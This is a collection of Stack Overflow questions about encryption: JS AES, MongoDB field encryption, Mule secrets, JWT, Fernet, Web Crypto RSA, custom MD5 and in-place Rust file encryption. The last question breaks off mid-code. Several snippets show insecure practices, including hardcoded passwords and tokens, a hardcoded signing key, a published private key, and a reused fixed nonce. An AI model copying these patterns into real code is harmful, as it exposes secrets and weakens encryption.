Cipher: function(e, a) 
{var declaration
  for (var f = 0; f &lt; 4 * d; f++)}
g = this.AddRoundKey(g, a, 0, d);
for (var c = 1; c &lt; h; c++){
&lt;&lt; each one is created with their own function &gt;&gt;
g = this.SubBytes(g, d);
g = this.ShiftRows(g, d); 
g = this.MixColumns(g, d); 
g = this.AddRoundKey(g, a, c, d); }
KeyExpansion: function(f) { some for loop, if loop, SubWord and RotWord are used here... }
SubWord: function(a) { some for loop and Sbox is used here..}
RotWord: function(a) { some for loop..}
AESEncrypt: function(j, a, t) {
    var k = 16;
    if (!(t == 128 || t == 192 || t == 256)) {
        return &quot;&quot;;
    }
    j = this.encodeUTF8(j);
    a = this.encodeUTF8(a);
    &lt;&lt; some code&gt;&gt;
    var y = this.Cipher(f, this.KeyExpansion(f));
    &lt;&lt;some code&gt;&gt;
    x = this.encodeBase64(x);
encodeBase64: function(n) { for loop.. }
decodeBase64: function(e) {
    e = (typeof e == &quot;undefined&quot;) ? false : e;
    var f, b, a, m, j, h, g, o, i = [], n, l;
    l = e ? this.decodeUTF8() : this; &lt;&lt;some for loop&gt;&gt;}
encodeUTF8: function(a) {
    var b = a.replace(/[\u0080-\u07ff]/g, function(e) { &lt;&lt; some code.. &gt;&gt;}
decodeUTF8: function() {
    var a = this.replace(/[\u00c0-\u00df][\u0080-\u00bf]/g, function(d) { &lt;&lt;some code..&gt;&gt;}
</code></pre>
<p>The encrypt.js is called in this function:</p>
<pre><code>function getControlPrefix() {
    var a2 = document.forms[0].a2.value;
    var a2n = &quot;&quot;;
    for(var i=0; i &lt; a2.length; i++){
        a2n += &quot;*&quot;;
    }

    var type=&quot;DATABASE&quot;;
    a2 = encrypt.AESEncrypt(a2, &quot;&lt;%=(String)session.getAttribute(&quot;__GETLOGINKEY&quot;)%&gt;&quot;, 256);
    document.forms[0].a3.value = a2;
    document.forms[0].a2.value = a2n;
    document.forms[0].txtResFrac.value= screen.width;
    if (getControlPrefix.prefix){
        return getControlPrefix.prefix;
    }
</code></pre>
<p>Hope this snippet of code helps in giving more light into the errors I'm getting.</p>
"
"<p>I'm using CSLFE and I need to back up my employee collection, specifically those with {orgId: ObjectId('xxx')}. However, the collection contains encrypted fields. I've noticed that the CSLFE Node.js driver also creates an encryption.__keyValut collection, which needs to be backed up alongside the employee collection.</p>
<p>The problem I'm facing is that I'm unsure how to establish a connection between the employee collection and the corresponding records in the encryption.__keyValut collection to ensure I backup everything accurately.</p>
<p>In short, how can I determine the relationship between the encryption.__keyValut collection and the encrypted data in the employee collection?</p>
"
"<p>Must connect to a MariaDB database through a SSH tunnel.
Use putty to open the tunnel with port forwarding and get error message
<code>RSA public key is not available client side (option serverRsaPublicKeyFile not set)</code>.
The database server provider does not support SSl/TLS encrypted messaging.
Apparently my jdbc-connector encrypts by default and I should switch that off.
But how?</p>
<p>Added <code>encrypt=false</code> in my Java code:</p>
<pre><code>  url = &quot;jdbc:mysql://&quot; + databaseURI.trim() + &quot;/&quot; + databaseSchema+ &quot;/encrypt=false&quot;;
  connection = DriverManager.getConnection(url, databaseUserName,
                    databasePassword);
</code></pre>
<p>as advised by my database server provider
but that had no result.</p>
"
"<p>This may be a two part question.
I am working on a Mulesoft flow pulling the data from salesforce to BigQuery.
As part of best practice, I understand that I should encrypt the passwords and store it in secure.yaml file and reference it in this way ${security::}.
However for GCP it expects a securekey.json file in connector.
<a href=""https://i.stack.imgur.com/dRC38.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/dRC38.png"" alt=""enter image description here"" /></a></p>
<p>So what is the best way to encrypt json file?
secure-properties-tool.jar only expects .yaml or .properties file to encrypt and does not work with json files.</p>
<p>I tried to put the information in a yaml with encrypted values and write a flow to convert yaml file to json. If I use this separate flow to generate runtime json file, not sure how to access the secret in a transform message.
<a href=""https://i.stack.imgur.com/7jjXB.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/7jjXB.jpg"" alt=""enter image description here"" /></a></p>
<p>I tried to write this separate yaml to json flow without encryption. I was hoping, the subsequent flow in the application picks up this new json file, and connect to GCP. However it failed.
The prior flow created the file but since the application was in a deployed state, maybe it didnt matter that the json file got created. The connector was not able to find the file.
When I re triggered the application with that created file the bigquery connector worked.
So not sure what is the correct way to get this to work.</p>
<p><strong>Additional details:</strong>
I am using Mule 4 application.
BigQuery connector version:
<a href=""https://i.stack.imgur.com/DcOGm.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/DcOGm.png"" alt=""enter image description here"" /></a>
xml code for connector</p>
<pre class=""lang-xml prettyprint-override""><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;

&lt;mule xmlns:file=&quot;http://www.mulesoft.org/schema/mule/file&quot; xmlns:bigquery=&quot;http://www.mulesoft.org/schema/mule/bigquery&quot;
    xmlns:http=&quot;http://www.mulesoft.org/schema/mule/http&quot;
    xmlns:tls=&quot;http://www.mulesoft.org/schema/mule/tls&quot; xmlns:kafka=&quot;http://www.mulesoft.org/schema/mule/kafka&quot; xmlns:salesforce=&quot;http://www.mulesoft.org/schema/mule/salesforce&quot; xmlns=&quot;http://www.mulesoft.org/schema/mule/core&quot; xmlns:doc=&quot;http://www.mulesoft.org/schema/mule/documentation&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.mulesoft.org/schema/mule/core http://www.mulesoft.org/schema/mule/core/current/mule.xsd
http://www.mulesoft.org/schema/mule/salesforce http://www.mulesoft.org/schema/mule/salesforce/current/mule-salesforce.xsd
http://www.mulesoft.org/schema/mule/kafka http://www.mulesoft.org/schema/mule/kafka/current/mule-kafka.xsd
http://www.mulesoft.org/schema/mule/tls http://www.mulesoft.org/schema/mule/tls/current/mule-tls.xsd
http://www.mulesoft.org/schema/mule/http http://www.mulesoft.org/schema/mule/http/current/mule-http.xsd
http://www.mulesoft.org/schema/mule/bigquery http://www.mulesoft.org/schema/mule/bigquery/current/mule-bigquery.xsd
http://www.mulesoft.org/schema/mule/file http://www.mulesoft.org/schema/mule/file/current/mule-file.xsd&quot;&gt;
    &lt;salesforce:sfdc-config name=&quot;Salesforce_Config&quot; doc:name=&quot;Salesforce Config&quot; doc:id=&quot;63e49cc6-1939-4390-a7ff-5b7fbf3fd8a8&quot; &gt;
        &lt;salesforce:basic-connection username=&quot;simba@santa.com&quot; password=&quot;126531&quot; securityToken=&quot;askdjhbkatfekw&quot; url=&quot;https://santacorp.my.salesforce.com/services/Soap/u/59.0&quot;/&gt;
    &lt;/salesforce:sfdc-config&gt;
    &lt;salesforce:sfdc-config name=&quot;sandbox&quot; doc:name=&quot;Salesforce Config&quot; doc:id=&quot;fd9cec1d-ae93-47cb-9268-29511623e974&quot; &gt;
        &lt;salesforce:basic-connection username=&quot;santa@banta.com&quot; password=&quot;12368512&quot; securityToken=&quot;weurygwiqeyrgw&quot; url=&quot;https://santacorp--dev.ramen.com/services/Soap/u/59.0&quot;/&gt;
    &lt;/salesforce:sfdc-config&gt;
    &lt;http:listener-config name=&quot;HTTP_Listener_config&quot; doc:name=&quot;HTTP Listener config&quot; doc:id=&quot;4e55c859-34b9-4c81-b94d-b1ceef77fcd0&quot; basePath=&quot;/api&quot; &gt;
        &lt;http:listener-connection host=&quot;0.0.0.0&quot; port=&quot;8083&quot; /&gt;
    &lt;/http:listener-config&gt;
    &lt;bigquery:config name=&quot;Google_bigquery_Config&quot; doc:name=&quot;Google_bigquery Config&quot; doc:id=&quot;9b28d71f-70f8-4206-9d59-da3b16d9acad&quot; &gt;
        &lt;bigquery:connection projectId=&quot;eng-sbx&quot; jsonServiceAccountKeyFile=&quot;test.json&quot;/&gt;
    &lt;/bigquery:config&gt;
    &lt;file:config name=&quot;File_Config&quot; doc:name=&quot;File Config&quot; doc:id=&quot;aa04a618-11b6-4a1b-94b8-0ba4c0e2d873&quot; &gt;
        &lt;file:connection /&gt;
    &lt;/file:config&gt;
</code></pre>
<p>The json file should have contents like so</p>
<pre class=""lang-json prettyprint-override""><code>{
    &quot;type&quot;: &quot;service_account&quot;,
    &quot;project_id&quot;: &quot;sandbox-control&quot;,
    &quot;private_key_id&quot;: &quot;123y1t23uy12r3uy12tf3&quot;,
    &quot;private_key&quot;: &quot;-----BEGIN PRIVATE KEY-----********-----END PRIVATE KEY-----\n&quot;,
    &quot;client_email&quot;: &quot;email.iam.gserviceaccount.com&quot;,
    &quot;client_id&quot;: &quot;12371862531&quot;,
    &quot;auth_uri&quot;: &quot;https://accounts.google.com/o/oauth2/auth&quot;,
    &quot;token_uri&quot;: &quot;https://oauth2.googleapis.com/token&quot;,
    &quot;auth_provider_x509_cert_url&quot;: &quot;https://www.googleapis.com/oauth2/v1/certs&quot;,
    &quot;client_x509_cert_url&quot;: &quot;https://www.googleapis.com/robot/v1/metadata/x509/something.iam.gserviceaccount.com&quot;
  }
</code></pre>
"
"<p>I would like to encrypt a few MongoDB collections that contain sensitive data. The requirement is to encrypt specific collections where CRUD operations will be performed.</p>
<p>I am aware of Field Encryption; however, is there any option to apply encryption at the collection level?</p>
"
"<p>I am using sonarqube to code quality of my nodejs app.
I am using npm crypto package to encrypt and decrypt.</p>
<p>Sonar qube thrown issue</p>
<blockquote>
<p>Make sure that encrypting data is safe here.</p>
</blockquote>
<p>Issue mentioned at my code sinppet is below,</p>
<pre><code>let cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(secret_obj.key), crypto.randomBytes(16));
</code></pre>
<p>I see this</p>
<blockquote>
<p>The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be preferred to the following combinations which are not secured:
Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in cryptographic protocols at all.
Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks</p>
</blockquote>
<p>But it is not clear to me,so what is the way to clear this issue from a nodejs app.</p>
"
"<p>I have this code:</p>
<pre><code>builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =&gt;
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidIssuer = AuthOptions.ISSUER,
            ValidateAudience = true,
            ValidAudience = AuthOptions.AUDIENCE,
            ValidateLifetime = true,
            IssuerSigningKey = AuthOptions.GetSymmetricSecurityKey(),
            ValidateIssuerSigningKey = true,
         };
});

app.Map(&quot;/login/{username}&quot;, (string username) =&gt; 
{
    var claims = new List&lt;Claim&gt; {new Claim(ClaimTypes.Name, username) };
    var jwt = new JwtSecurityToken(
            issuer: AuthOptions.ISSUER,
            audience: AuthOptions.AUDIENCE,
            claims: claims,
            expires: DateTime.UtcNow.Add(TimeSpan.FromMinutes(2)),
            signingCredentials: new SigningCredentials(AuthOptions.GetSymmetricSecurityKey(), SecurityAlgorithms.HmacSha256));
            
    return new JwtSecurityTokenHandler().WriteToken(jwt);
});

public class AuthOptions
{
    public const string ISSUER = &quot;MyAuthServer&quot;; 
    public const string AUDIENCE = &quot;MyAuthClient&quot;; 
    const string KEY = &quot;mysupersecret_secretsecretsecretkey!123&quot;;   

    public static SymmetricSecurityKey GetSymmetricSecurityKey() =&gt; 
        new SymmetricSecurityKey(Encoding.UTF8.GetBytes(KEY));
}
</code></pre>
<p>How do I encrypt the payload data in my token? Perhaps <code>TokenDecryptionKey</code> should be added to <code>options.TokenValidationParameters</code>, but how do I encrypt this token initially?</p>
"
"<p>I am using the Python <a href=""https://cryptography.io/en/latest/"" rel=""nofollow noreferrer"">cryptography</a> package to generate encryption data. I can generate an encryption token no problem, like this:</p>
<pre><code>b'gAAAAABl4-BVigmotWHPCxDKkGT-weDwK0DcdiHyW9U8rthD2B61dTCQw1Gnt7JcyCvWmxW2INNws_hbK1ecReEaqJKEaXJCZg=='
</code></pre>
<p>I can then use that to successfully decrypt my data using that same cryptography package.</p>
<p>I want to decrypt my data using a different package (a JavaScript package), so I need to extract the IV and cipher text from that token. However, I'm running into issues, since Base64 tokens like that are not supposed to contain hyphens nor underscores. By strictly following the <a href=""https://github.com/fernet/spec/blob/master/Spec.md"" rel=""nofollow noreferrer"">fernet spec</a>, the IV should be this:</p>
<pre><code>b'igmotWHPCxDKkGT-weDwKw=='
</code></pre>
<p>However, when I put that into my JavaScript package, it's rejected, since Base64 encoded data cannot have hyphens. Are the hyphens and underscores supposed to be replaced with something else?</p>
<p>Notes:</p>
<ul>
<li>According to the <a href=""https://github.com/fernet/spec/blob/master/Spec.md#token-format"" rel=""nofollow noreferrer"">fernet spec</a>, the token should have <code>57 + 16x</code> bytes (<code>456 + 128x bits</code>), so 73 bytes, 89 bytes, etc. According to <code>len(base64.urlsafe_b64decode(token))</code> (where <code>token</code> stores the token above), my token has 73 bytes, so that appears to be fine.</li>
<li>To get the IV above, I am using <code>urlsafe_b64encode(urlsafe_b64decode(token)[9:25])</code>. Using the <code>urlsafe</code> version was inspired by <a href=""https://stackoverflow.com/a/55106160/10368970"">this</a>. I was using <code>b64edecode()</code>, but I would sometimes (but not always) get the error <code>binascii.Error: Invalid base64-encoded string: number of data characters (93) cannot be 1 more than a multiple of 4</code>.</li>
</ul>
"
"<pre><code> def encrypt(self):
        if not os.path.exists(self.filename):
            raise Exception('File does not exist!')

        # Generate a random salt
        salt = Fernet.generate_key()

        # Calculate the HMAC of the salt using the key
        hmac_digest = hmac.new(self.key, salt, hashlib.sha256).digest()

        # Encrypt the data with the salt and key
        fernet = Fernet(salt + self.key)
        with open(self.filename, 'rb') as file:
            file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)

        # Write the encrypted data to the file
        with open(self.filename, 'wb') as file:
            file.write(encrypted_data)

     

 def decrypt(self):
        if not os.path.exists(self.filename):
            raise Exception('File does not exist!')

        # Read the salt and HMAC digest from the separate file
        with open(self.filename + '.salt', 'rb') as file:
                k_sz = Fernet.key_size
                salt = file.read(k_sz)
                hmac_digest = file.read(hashlib.sha256().digest_size)
</code></pre>
<p>here in the decrypt function i am trying to get the salt and hmac value stored in the encrypted file. But receiving the error</p>
<pre><code> File &quot;C:\python programs\test2.py&quot;, line 61, in decrypt
    k_sz = Fernet.key_size
           ^^^^^^^^^^^^^^^
AttributeError: type object 'Fernet' has no attribute 'key_size'
</code></pre>
<p>i have tried .KEY_SIZE and Fernet(key=None).key_size then it says key value as none not expected</p>
"
"<p>I have generated private key as following:</p>
<pre class=""lang-bash prettyprint-override""><code>openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048

openssl rsa -pubout -in private_key.pem -out public_key.pem

openssl pkcs8 -topk8 -inform PEM -outform PEM -in private_key.pem -out private_key_pkcs8.pem -nocrypt
</code></pre>
<p>The  private key is embedded in the code snippet. Then I ecrypted a plaintext like the following:</p>
<pre class=""lang-bash prettyprint-override""><code>echo -n &quot;abcdef&quot; | openssl rsautl -encrypt -pubin -inkey public_key.pem | openssl base64 &gt; enc_simple.txt
</code></pre>
<p>This is also embedded in the code snippet. If I do the following:</p>
<pre class=""lang-bash prettyprint-override""><code>base64 -d enc_simple.txt &gt; enc_simple.bin
openssl rsautl -decrypt -inkey private_key_pkcs8.pem -in enc_simple.bin -out decrypted_simple.txt
</code></pre>
<p>I get back &quot;abcdef&quot;. SO with <code>openssl</code> everything is working. Then I want to recreate this entire scenario using <a href=""https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API"" rel=""nofollow noreferrer""><code>Web Crypto API</code></a> but the decryption is failing. Importing the private key is ok but the rest fails with <code>OperationError</code> with no error message. It is extremely obscure and hard to debug.</p>
<p>I have also ran:</p>
<pre class=""lang-bash prettyprint-override""><code>od -An -vtu1 enc_simple.bin
</code></pre>
<p>to see the <code>Uint8Array</code> values and compare them with what I get from <code>str2ab</code> from the codesnippet. They match!</p>
<p>So I am stuck with no error message. I am trying to understand why the decryption is failing.</p>
<p><div class=""snippet"" data-lang=""js"" data-hide=""false"" data-console=""true"" data-babel=""false"">
<div class=""snippet-code"">
<pre class=""snippet-code-js lang-js prettyprint-override""><code>const encryptedData = `gLiN3BLWTxbwpE5bwcFiB7Y/nK0H4iz9lK0sehMIJtoAPibDPZ8EYp8EnzsGFlKC
+GXse6Ka5YC7UKYn7xUvfBbCDSY7RJ/J9oAzpCEHvCnFOmrsvUtNEhP4w3LTaKL/
qKmjQZaPlZNWCmrzrW3g2A6DUCqLx5EQwCcwME2WjYVhuMZfZOKqtp+uukJMUf3h
cC9J8QkPCk1NZogCad29b7q7JLN1uWEQzOUgB6BqJfAp8kL92dftOy2gpWoGYraI
YPU3Tmp12txMyUY0yKsr4c2dOzxwWUW+ZssVkc6ZGqFVufADziZDp2sfFaz8yBuI
qek7S0KXd6A7qWBYBrzzyw==`; //abcdef
const privKeyPEM=`-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDJiQlvlYbTqi/W
bLa7nzaF4Wz+ypQa01HD+UMHX25Uv3n6P69ucKs/OOdWbcenknAmSBK/VzgIsjlm
vak3y1LoYImMhm8R26Arv8Fv7jwQkbBxVnOn6yfTL2h1SRK+zFzWumfbl2vp7POG
s7CRQaK0HFPKroVlYHlinTlYXSlFqdaknH2ip1J2YPJ3O4w0/ME8gBZ0Mj1XkokB
Qc0Lk76BpvfTuBbzvLYI4bq0/jSoM6ANecqK+T/7/aSFxh2x8acJ/xzJg2H7I+de
pXZ1M9Mz0x94jWRfc9Q9qLgY6AuX7MUyb2YEs+vMxcim60fvktHAaXvn9vM0eauC
B+hpThohAgMBAAECggEAINub0zqAwe/EXuRYopxhqlBHkf77SKhdc2MnX4NanKyf
OYK6mnn6IZOoe/noDFUevc8QZ2vT8e8E1tBjT3px6PscUfH1F+dD5P4djp874cOv
Dbt3ndAELTVUhZLFYKA3HrdDiZTVfk0oozSWvAgEe/MGYkwz6YRiJgbWO6bsvLOa
5Ehhd7Ocxbs4B389ad3bVzRkk02/IRDEeO1z0+22Wv1NIe0Spzl6FVLspL6JdmEu
60rpShfwN7D0G4TQYYp/9Sh+zt0ThIF4kqQoURx5E2uQaDUAT206itMG2mUWYSR1
M37U+46kpWBz0jDaRFmqlySKrmkbx7kWXju8wP1ZAQKBgQDvlq4B3jAPd+Pu/Rxw
GORV5S8PdJrkQnx8BeAviGAVc2w6EMyRWusVzL95mpRS0t0E5xZtB2kLkVU/I08b
j+WqrGFqFp8niXYnJsien8nfLct0AhJVvVaPtt8lHP9SKniBOZc0owzFljnt+4/6
M4ifAiKvJYOqPSdGpJgvJq4TsQKBgQDXVxJCjUNInb4p0WWljxdcMpgSDPn53+BG
M/MrxVbTOvHhKsbNlglYxT/87J+8lFKS5Y9EkpqekCY1aGJ0PYfLBMowvNAwiP2s
89++PTuEO/hK16Xb8znZ7rUGdJdRUitBN8iVkWNLA2pzalcZkkHbIWQbDuJOPbdO
bo1u06U5cQKBgAgeliUQD5bmnD3kLAuMfGiAzNh8PieQLUHSvSc/OupfMALDwPsI
FsF1X+PSHka0SLM61aK6RpASy83I94xakxD2qJJ808X2PZ/UC6Z8ic3bcnKrA04O
jZlvPB643do+ADl45yvsfqlPjwUGqnlzN6UT4HMJFW42hlc5isLGT83xAoGBANT/
UxhxEfRp0wcaECjKeJjBkpmILFp0jynhiM3qzA7zZv0JissfdO9RbBGJHBczvtl+
J0/0kuv0OVbqgTfpBMBTZIsAuAzJ8+F2+AD8IDqT9uxQkcYVt0tRSc2w1VuioxZH
TyhiPoycPFcdADpS6MEPLi11c3NgqEf0IgFVZ0CBAoGBAMybGC+IImSDpZzLaSpz
KAD6Vyto7eK4pENH8bPcM2Hpy7aMGJkr6Q/NT34p/vSfFG2gm8ueILhvqQ8yB6h6
gtfHOEu7CC/8WL4Y/WehrpD+fTTSOd/C+JZJbXjHjJ55NX1JzgeCPWJP2QOyXE85
VLq+2V8bhsQxi4JylnH6suLB
-----END PRIVATE KEY-----`
const
    atob = (window || self)?.atob,
    subtle = (window || self).crypto.subtle,
    trimWs = (s) =&gt; s.replace(/\s*/g,""""),
    trimHeader = (s) =&gt; s.replace(/-----(?:BEGIN|END) PRIVATE KEY-----/gi, """");
async function importPrivateKey (pemkey) {
    const binaryKey = atob(trimWs(trimHeader(pemkey)));
    const keyBuffer = new Uint8Array(binaryKey.length);
    for (let i = 0; i &lt; binaryKey.length; i++) {
        keyBuffer[i] = binaryKey.charCodeAt(i);
    }
    return await subtle.importKey(
        ""pkcs8"",
        keyBuffer,
        { name: ""RSA-OAEP"", hash: ""SHA-256""},
        false,
        [""decrypt""]
    );
}
async function decryptData (privateKey, encryptedData) {
      const decrypted = await subtle.decrypt(
          { name: ""RSA-OAEP"", hash: ""SHA-256""},
          privateKey,
         str2ab(atob(trimWs(encryptedData)))
      );
      return (new TextDecoder('utf-8')).decode(decrypted);
}
function str2ab (binaryStr) {
    const len = binaryStr.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i &lt; len; i++) {
        bytes[i] = binaryStr.charCodeAt(i); // Accurately map each char to a byte
    }
    return bytes; // Convert to ArrayBuffer
};


(async () =&gt; {
  try {
    const privKey = await importPrivateKey(privKeyPEM);
    console.log(privKey);
    const decrypted = await decryptData(privKey, encryptedData);
  } catch (err) {
    console.error(""Err:"", err, ""Err.massage:"", err.message);
  }
})()</code></pre>
</div>
</div>
</p>
"
"<p>I have a dataframe.
I need to write dataframe to excel file with password required when open it.
On Linux environment.
How can i do that?</p>
<p>I try some packages like msoffcrypto, but it just can decrypt. encrypt feature is EXPERIMENT, cann't use now.
pywin32 and xlings just available on Win or Mac, so cann't use too.
I stucked. Help me</p>
"
"<p>I am trying to rewrite MD5 hashing algorithm from scratch, the program can give me the output, but it isn't correct if I double check with other program and the hashlib library. I would love if some expert can have a look and tell me where I got it wrong</p>
<pre><code>import struct
from enum import Enum
from bitarray import bitarray


from math import (
    floor,
    sin,
)

class MD5Buffer(Enum):
    A = 0x67452301
    B = 0xEFCDAB89
    C = 0x98BADCFE
    D = 0x10325476


class MD5(object):
    _string = None
    _buffers = {
        MD5Buffer.A: None,
        MD5Buffer.B: None,
        MD5Buffer.C: None,
        MD5Buffer.D: None,
    }

    @classmethod
    def hash(cls, string):
        cls._string = string

        preprocessed_bit_array = cls._step_2(cls._step_1())
        cls._step_3()
        cls._step_4(preprocessed_bit_array)
        return cls._step_5()

    @classmethod
    def _step_1(cls):
        bit_array = bitarray(endian=&quot;big&quot;)
        bit_array.frombytes(cls._string.encode(&quot;utf-8&quot;))
        bit_array.append(1)
        while len(bit_array) % 512 != 448:
            bit_array.append(0)

        return bitarray(bit_array, endian=&quot;little&quot;)

    @classmethod
    def _step_2(cls, step_1_result):
        length = (len(cls._string) * 8) % pow(2, 64)
        length_bit_array = bitarray(endian=&quot;little&quot;)
        length_bit_array.frombytes(struct.pack(&quot;&lt;Q&quot;, length))

        result = step_1_result.copy()
        result.extend(length_bit_array)
        return result

    @classmethod
    def _step_3(cls):
        for buffer_type in cls._buffers.keys():
            cls._buffers[buffer_type] = buffer_type.value

    @classmethod
    def _step_4(cls, step_2_result):
        F = lambda x, y, z: (x &amp; y) | (~x &amp; z)
        G = lambda x, y, z: (x &amp; z) | (y &amp; ~z)
        H = lambda x, y, z: x ^ y ^ z
        I = lambda x, y, z: y ^ (x | ~z)

        rotate_left = lambda x, n: (x &lt;&lt; n) | (x &gt;&gt; (32 - n))

        modular_add = lambda a, b: (a + b) % pow(2, 32)

        T = [floor(pow(2, 32) * abs(sin(i + 1))) for i in range(64)]

        N = len(step_2_result) // 32

        for chunk_index in range(N // 16):
            start = chunk_index * 512
            X = [step_2_result[start + (x * 32) : start + (x * 32) + 32] for x in range(16)]

            X = [int.from_bytes(word.tobytes(), byteorder=&quot;little&quot;) for word in X]

            A = cls._buffers[MD5Buffer.A]
            B = cls._buffers[MD5Buffer.B]
            C = cls._buffers[MD5Buffer.C]
            D = cls._buffers[MD5Buffer.D]

            for i in range(4 * 16):
                if 0 &lt;= i &lt;= 15:
                    s = [7, 12, 17, 22]
                    f = F(B, C, D)
                    k = i
                elif 16 &lt;= i &lt;= 31:
                    s = [5, 9, 14, 20]
                    f = G(B, C, D)
                    k = (5 * i + 1) % 16
                elif 32 &lt;= i &lt;= 47:
                    s = [4, 11, 16, 23]
                    f = H(B, C, D)
                    k = (3 * i + 5) % 16
                elif 48 &lt;= i &lt;= 63:
                    s = [6, 10, 15, 21]
                    f = I(B, C, D)
                    k = (7 * i) % 16

                temp = B + rotate_left((A + f + T[i] + X[k]) % 2**32, s[i%4])
                A, B, C, D = D, temp % 2**32, B, C

            cls._buffers[MD5Buffer.A] = (cls._buffers[MD5Buffer.A] + A) % 2**32
            cls._buffers[MD5Buffer.B] = (cls._buffers[MD5Buffer.B] + B) % 2**32
            cls._buffers[MD5Buffer.C] = (cls._buffers[MD5Buffer.C] + C) % 2**32
            cls._buffers[MD5Buffer.D] = (cls._buffers[MD5Buffer.D] + D) % 2**32

    @classmethod
    def _step_5(cls):
        A = struct.unpack(&quot;&lt;I&quot;, struct.pack(&quot;&gt;I&quot;, cls._buffers[MD5Buffer.A]))[0]
        B = struct.unpack(&quot;&lt;I&quot;, struct.pack(&quot;&gt;I&quot;, cls._buffers[MD5Buffer.B]))[0]
        C = struct.unpack(&quot;&lt;I&quot;, struct.pack(&quot;&gt;I&quot;, cls._buffers[MD5Buffer.C]))[0]
        D = struct.unpack(&quot;&lt;I&quot;, struct.pack(&quot;&gt;I&quot;, cls._buffers[MD5Buffer.D]))[0]

        return f&quot;{format(A, '08x')}{format(B, '08x')}{format(C, '08x')}{format(D, '08x')}&quot;

print(MD5.hash(&quot;Hello, world!&quot;))
</code></pre>
<p>I have tried rewriting the function many times, following other examples on Github but still to no result.</p>
"
"<p>I tried to use <code>aes-gcm</code> and <code>sodiumoxide</code> Rust crates and in both cases I was having an issue where I tried to encrypt a file larger than the size of a chunk buffer I will get an invalid ciphertext which is not decryptable.</p>
<p>Here's the example conditions I want this program to run at:<br />
I need to encrypt 50 gigabyte file but have only 2 gigabytes of ram and 4 gigabytes of storage, so I can't take the entire file into memory and I can't write it to a new file in chunks. I need to somehow replace chunks of the file with it's encrypted ones.</p>
<p>Here's my code:</p>
<pre><code>use clap::Parser;
use sodiumoxide::crypto::secretbox;
use sodiumoxide::crypto::secretbox::{Key, Nonce};
use sodiumoxide::hex;
use std::fs::OpenOptions;
use std::io::{self, Read, Seek, SeekFrom, Write};

const CHUNK_SIZE: usize = 1024; // Adjust chunk size as needed

#[derive(Parser)]
struct Options {
    #[clap(subcommand)]
    command: Command,
}

#[derive(Parser)]
enum Command {
    Encrypt,
    Decrypt,
}

fn main() -&gt; io::Result&lt;()&gt; {
    let args = Options::parse();
    match args.command {
        Command::Encrypt =&gt; encrypt_file(&quot;poemfortest.txt&quot;),
        Command::Decrypt =&gt; decrypt_file(&quot;poemfortest.txt&quot;),
    }
}

fn encrypt_file(input_file_path: &amp;str) -&gt; io::Result&lt;()&gt; {
    let input_file = OpenOptions::new()
        .read(true)
        .write(true)
        .open(input_file_path)?;

    // Initialize sodiumoxide library
    sodiumoxide::init().expect(&quot;Failed to initialize sodiumoxide&quot;);

    let rawkey =
        hex::decode(&quot;ba72744932db553b55cb944aa8e5739cf23a7f668c32d164c51ce09d4d631160&quot;).unwrap();

    let rawnonce = hex::decode(&quot;48ccdb552de220538ac1667e7e99054fd39ad417c5d83c6e&quot;).unwrap();

    // Generate the key and nonce used for encryption
    let key = Key::from_slice(&amp;rawkey).expect(&quot;Invalid key&quot;);
    let nonce = Nonce::from_slice(&amp;rawnonce).expect(&quot;Invalid nonce&quot;);

    let mut input_file = input_file;
    let mut buffer = [0u8; CHUNK_SIZE];
    let mut offset: u64 = 0;

    loop {
        let bytes_read = input_file.read(&amp;mut buffer)?;

        if bytes_read == 0 {
            break;
        }

        // Encrypt the chunk
        let encrypted_chunk = secretbox::seal(&amp;buffer[..bytes_read], &amp;nonce, &amp;key);

        // Seek back to the beginning of the chunk
        input_file.seek(SeekFrom::Start(offset))?;

        // Write the encrypted chunk to the input file
        input_file.write_all(&amp;encrypted_chunk)?;

        // Move the offset to the next chunk
        offset += bytes_read as u64;
    }

    println!(&quot;Encryption completed successfully.&quot;);
    Ok(())
}

fn decrypt_file(input_file_path: &amp;str) -&gt; io::Result&lt;()&gt; {
    let input_file = OpenOptions::new()
        .read(true)
        .write(true)
        .open(input_file_path)?;

    // Initialize sodiumoxide library
    sodiumoxide::init().expect(&quot;Failed to initialize sodiumoxide&quot;);

    let rawkey =
        hex::decode(&quot;ba72744932db553b55cb944aa8e5739cf23a7f668c32d164c51ce09d4d631160&quot;).unwrap();

    let rawnonce = hex::decode(&quot;48ccdb552de220538ac1667e7e99054fd39ad417c5d83c6e&quot;).unwrap();

    // Generate the key and nonce used for decryption
    let key = Key::from_slice(&amp;rawkey).expect(&quot;Invalid key&quot;);
    let nonce = Nonce::from_slice(&amp;rawnonce).expect(&quot;Invalid nonce&quot;);

    let mut input_file = input_file;
    let mut buffer = [0u8; CHUNK_SIZE];
    let mut offset: u64 = 0;

    loop {
        let bytes_read = input_file.read(&amp;mut buffer)?;

        if bytes_read == 0 {
            break;
        }

        // Decrypt the chunk
        let decrypted_chunk = match secretbox::open(&amp;buffer[..bytes_read], &amp;nonce, &amp;key) {
            Ok(decrypted) =&gt; decrypted,
            Err(_) =&gt; {
                eprintln!(&quot;Error: Failed to decrypt chunk.&quot;);
                return Ok(());
            }
        };

        // Seek back to the beginning of the chunk
        input_file.seek(SeekFrom::Start(offset))?;

        // Write the decrypted chunk to the input file
